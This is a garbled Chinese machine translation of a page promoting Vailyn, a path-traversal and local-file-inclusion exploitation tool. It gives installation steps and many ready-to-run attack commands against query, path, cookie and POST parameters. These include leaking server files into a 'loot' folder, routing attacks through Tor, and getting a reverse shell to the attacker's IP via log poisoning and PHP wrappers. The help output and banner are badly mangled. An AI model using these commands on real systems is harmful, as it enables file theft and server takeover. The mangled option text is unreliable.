# vailyn:Python 中一个分阶段的、规避的路径遍历+ LFI 扫描和开发工具

> 原文：<https://kalilinuxtutorials.com/vailyn/>

[![](img/351800917a2201cab58a2ba6cfc803a9.png)](https://1.bp.blogspot.com/-iPJ3sL1uJr8/YUNam-oNz2I/AAAAAAAAK24/3p3eQe0pppMjuFcZMMnWntMoEyP7Diw1wCLcBGAsYHQ/s728/download%2B%25281%2529.png)

**Vailyn** 是一款针对路径遍历和文件包含漏洞的多阶段漏洞分析和利用工具。它旨在尽可能提高性能，并提供广泛的过滤规避技术。

**它是如何工作的？**

Vailyn 分两个阶段运营。首先，它检查漏洞是否存在。它通过尝试访问/etc/passwd(或一个用户指定的文件)来实现这一点，并使用所有规避的有效负载。通过分析响应，有效载荷与其他有效载荷分离开来。

现在，用户可以自由选择使用哪些有效载荷。只有这些有效载荷将用于第二阶段。

第二阶段是剥削阶段。现在，它试图使用一个文件和一个目录字典从服务器中泄漏所有可能的文件。搜索深度和目录置换级别可以通过自变量来调整。可选地，它可以下载找到的文件，并保存在它的 loot 文件夹。或者，它会试图获得系统上的反向外壳，让攻击者完全控制服务器。

现在，它支持多种攻击途径:通过查询、路径、cookie 和 POST 数据进行注入。

**为什么会相分离？**

分成几个阶段是为了极大地提高工具的性能。在以前的版本中，每个有效负载都会检查每个文件-目录组合。这导致了巨大的开销，因为有效负载总是被再次使用，尽管不为当前页面工作。

**安装**

推荐和测试的 Python 版本是 3.7+版本，但它应该也能很好地与 Python 3.5 和 Python 3.6 兼容。要安装 Vailyn，请从“发布”选项卡下载归档文件，或者执行

**$ git 克隆 https://github.com/VainlyStrain/Vailyn**

一旦安装到您的系统上，您将需要安装 Python 依赖项。

**Unix 系统**

在 Unix 系统上，运行以下命令就足够了

**$ pip install-r requirements . txt #–用户**

**窗户**

Vailyn 使用的一些库不能很好地与 Windows 兼容，或者将无法安装。

如果您使用 Windows，请使用`**pip**`安装`**Vailyn\·›\requirements-windows.txt**`中列出的要求。

如果 twisted 安装失败，这里有一个非官方版本，应该在 Windows 下构建。请记住，这是第三方下载，不一定保证完整性。成功安装后，在`**requirements-windows.txt**`上再次运行 pip 应该可以工作。

**最后的步骤**

如果你想完全使用反向外壳模块，你需要安装`**sshpass**`、`**ncat**`和`**konsole**`。软件包名称因 Linux 发行版而异。在 Windows 上，您需要事先手动启动监听器。如果不喜欢`**konsole**`，可以在 **`core/config.py`中指定不同的终端模拟器。**

就是这样！通过移动到它的安装目录并执行

【T0 美元的巨蟒信托】

**用途**

韦林有 3 个强制参数: **`-v VIC, -a INT and -p2 TP P1 P2`。**然而，根据 **`-a`，**可能需要更多的论证。

**，\ /，
':。。/.。/ .:'【T3]':；。:\ .,:/ "./;..::'
'，':。,.__.”“”`:.__:''.:' ';.. ,;' * * '., .:'` v；。；' v' o
。''..:.'。
“”:；，‘‘‘
o’。:
*
| vaylyn |
【VainlyStrain】
Vsynta vaylyn-v VIC-A INT-p2 TP P1 P2
[-P PAM][-I F][-Pi VIC 2]
[-C][-n][-d I J K]
[-s T][-T][-L]
[-L][-P][-A]
强制:【T17 JSON
p | spider(partial)3 | cookie
1 |查询参数 4| POST 数据、plain
-p2 TP P1 P2、–phase 2 TP P1 p2
第二阶段攻击、需要的参数
┌[值]─────────────┬────────────────────┐│TP│P1│p2│
├─────────┼─────────────┼────────────────────┤
│泄漏│文件 Dict │目录 Dict │
│注入│IP addr│
│监听端口 –param PAM 查询参数或–Attack 1，4，5
-i F，–check F 要在阶段 1 中检查的文件(df: etc/passwd)
-Pi VIC2，–VI C2 VI C2 攻击目标，第 2 部分【POST-payload】
-C C，–cookie C 要追加的 Cookie(以头格式)
-l，–loot 将找到的文件下载到 loot 文件夹
-d I J K，–depth I J K
depth(I:I 稳定切换为 Arjun
-t，–tor 管道攻击通过 Tor 匿名网络
-L，–lfi 额外使用 PHP 包装器泄露文件
-n，–nosploit 跳过阶段 2(不需要-p2 TP P1 P2)
-P，–精确使用阶段 1 中的精确深度(不是一个范围)
-A，–app Start Vailyn 的 Qt5 接口
develop:
–调试显示每一条尝试过的路径，甚至 404s。
–版本打印程序版本并退出。
–not main 避免子进程调用中的 notify2 崩溃。
信息:
使用绝对路径泄漏文件:-d 0 0 0
使用绝对路径获取 shell:-d0 X 0**

Vailyn 目前支持 5 种攻击媒介，并提供了一个爬虫来自动化所有这些媒介。执行的攻击由`**-a INT**`参数标识。

**INT 攻击
——————
1 基于查询的攻击(https://site.com？文件=../../../)
2 基于路径的攻击(https://site.com/../../../)
3 基于 cookie 的攻击(会为你抓取 cookie)
4 普通 post 数据(ELEM1=VAL1 & ELEM2=../../../)
5 json post 数据({"file ":"../../../))
蜘蛛抓取+使用所有向量分析来自站点的所有 URL
部分蜘蛛抓取+仅使用选择的向量分析来自站点的所有 URL**

您还必须指定一个攻击目标。这是通过`**-v VIC**`和`**-Pi VIC2**`完成的，其中-v 是注射点之前的部分，而-Pi 是其余部分。

例如:如果最终的 URL 应该是这样的:`**https://site.com/download.php?file=<ATTACK>&param2=necessaryvalue**`，您可以指定`**-v** h**ttps://site.com/download.php**`和`**-Pi &param2=necessaryvalue**`(和`**-p file**`，因为这是一个查询攻击)。

如果您想在扫描中包含 PHP 包装器(如 php://filter)，请使用`**--lfi**`参数。在第 1 阶段结束时，您将看到一个额外的选择菜单，其中包含有效的包装器。(如果有)

如果被攻击的站点位于登录页面之后，您可以通过`**-c COOKIE**`提供一个认证 cookie。如果你想攻击 Tor，使用**T1。**

**第一期**

这是分析阶段，在此阶段，工作载荷与其他载荷分离开来。

默认情况下，`/etc/passwd`是向上看的。如果服务器没有运行 Linux，您可以通过`-i FILENAME`指定一个定制文件。注意，您必须在文件名中包含子目录**。您可以使用`-d`的第一个值(默认值=8)来修改查找深度。如果要使用绝对路径，请将第一个深度设置为 0。**

**第二阶段**

这是利用阶段，Vailyn 将尝试泄漏尽可能多的文件，或使用各种技术获得反向外壳。

阶段 2 中的查找深度(向后遍历的最大层数)由参数`**-d**`的第二个值指定。子目录排列的级别由`**-d**`的第三个值设置。

如果您使用绝对路径进行攻击并执行泄漏攻击，请将所有深度设置为 0。如果要获得反向壳，请确保第二个深度大于 0。

通过指定`**-l**`，Vailyn 不仅会在终端上显示文件，还会将文件下载保存到 loot 文件夹中。

如果您想要一个详细的输出(显示每个输出，而不仅仅是找到的文件)，您可以使用`**--debug**`。请注意，输出变得非常混乱，这基本上只是一个调试帮助。

要执行暴力攻击，您需要指定`**-p2 leak FIL PATH**`，其中

*   FIL 是一个字典文件，只包含**文件名**(如 index.php)
*   PATH 是一个字典文件，只包含**目录名**。Vailyn 将为您处理目录排列，因此您每行只需要一个目录。

要通过代码注入获得反向外壳，可以使用`**-p2 inject IP PORT**`，其中

*   IP 是你的倾听 IP
*   端口是您想要监听的端口。

**警告**

Vailyn 采用日志中毒技术。因此，您指定的 IP 将在服务器日志中可见。

技术(仅适用于 LFI 内含物):

*   仅适用于过时的服务器
*   **T2`Apache + Nginx Log Poisoning & inclusion`**
*   **T2`SSH Log Poisoning`**
*   **T2`poisoned mail inclusion`**
*   封装器
    *   **T2`expect://`**
    *   **T2`data:// (plain & b64)`**
    *   **T2`php://input`**

**假阳性预防**

为了区分真实结果和假阳性，Vailyn 进行了以下检查:

*   检查响应的状态代码
*   检查响应是否与攻击开始前的响应相同:这很有用，例如，当服务器返回 200，但忽略有效负载输入或如果找不到文件则返回默认页面时。
*   与#2 类似，对查询 GET 参数处理执行额外的检查(当服务器返回一个所需参数丢失的错误时很有用)
*   检查空响应
*   检查响应内容中是否有常见的错误签名
*   检查有效负载是否包含在响应中:这是对服务器响应 200 不存在的文件的情况的额外检查，并在消息中反映有效负载(如../../找不到机密)
*   检查整个响应是否包含在 init check response 中:当服务器有一个缺省的 include(在 404 的情况下会消失)时很有用
*   对于`-a 2`，如果响应内容与来自服务器根 URL 的内容匹配，则执行额外的检查
*   如果使用`/etc/passwd`作为查找文件，则使用正则表达式检查它

**例子**

*   简单查询攻击，泄露文件第二阶段:**`$ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file`**–>`**http://site.com/download.php?file=../INJECT**`
*   查询攻击，但是我知道一个文件`**file.php**`正好存在于包含点之上的 2 层:`**$ Vailyn -v "http://site.com/download.php" -a 1 -p2 leak dicts/files dicts/dirs -p file -i file.php -d 2 X X -P**`这将大大缩短阶段 1 的持续时间，因为它是一个有针对性的攻击。
*   简单路径攻击:**`$ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs`**–>`**http://site.com/../INJECT**`
*   路径攻击，但是我需要查询参数和标签:`**$ Vailyn -v "http://site.com/" -a 2 -p2 leak dicts/files dicts/dirs -Pi "?token=X#title"**`–>`**http://site.com/../INJECT?token=X#title**`
*   简单的 cookie 攻击:`**$ Vailyn -v "http://site.com/cookiemonster.php" -a 3 -p2 leak dicts/files dicts/dirs**`将获取 Cookie，您可以选择您想要下毒的 Cookie
*   普通攻击后:`**$ Vailyn -v "http://site.com/download.php" -a 4 -p2 leak dicts/files dicts/dirs -p "DATA1=xx&DATA2=INJECT"**`会用有效载荷感染数据 2
*   POST JSON 攻击:`**$ Vailyn -v "http://site.com/download.php" -a 5 -p2 leak dicts/files dicts/dirs -p '{"file": "INJECT"}'**`
*   攻击，但目标在登录屏幕后:`**$ Vailyn -v "http://site.com/" -a 1 -p2 leak dicts/files dicts/dirs -c "sessionid=foobar"**`
*   攻击，但我希望在端口 1337 上有一个反向 shell:`**$ Vailyn -v "http://site.com/download.php" -a 1 -p2 inject MY.IP.IS.XX 1337 # a high Phase 2 Depth is needed for log injection**`(如果在 Unix 上，将为您启动一个 ncat 监听器)
*   爬虫模式下完全自动化:`**$ Vailyn -v "http://root-url.site" -a A**` *你也可以指定其他参数，像 cookie，深度，lfi &查找文件这里*
*   全自动化，但阿琼需要 **`--stable` : `$ Vailyn -v "http://root-url.site" -a A -s ANY`**

[**Download**](https://github.com/VainlyStrain/Vailyn)